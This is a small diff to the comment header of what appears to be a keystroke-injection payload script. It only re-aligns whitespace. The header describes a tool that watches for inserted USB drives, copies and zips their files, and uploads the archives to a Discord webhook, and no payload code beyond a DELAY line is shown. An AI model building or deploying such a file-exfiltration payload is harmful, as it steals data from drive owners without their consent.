@@ -1,11 +1,11 @@
 REM ┌────────────────────────────────────────────────────────┐
-REM │ hooker01 | github.com/hooker01                          │
-REM │ Description: Detects inserted USB drives, copies files  │
-REM │              (excluding videos), zips them under 10MB,  │
-REM │              and uploads each archive to a Discord      │
-REM │              webhook.                                   │
-REM │ Note: Replace 'WEBHOOK_LINK' with your URL.             │     
-REM │ Target: Windows 8.1                                     │
+REM │ hooker01 | github.com/hooker01                         │
+REM │ Description: Detects inserted USB drives, copies files │
+REM │              (excluding videos), zips them under 10MB, │
+REM │              and uploads each archive to a Discord     │
+REM │              webhook.                                  │
+REM │ Note: Replace 'WEBHOOK_LINK' with your URL.            │     
+REM │ Target: Windows 8.1                                    │
 REM └────────────────────────────────────────────────────────┘
 
 DELAY 300
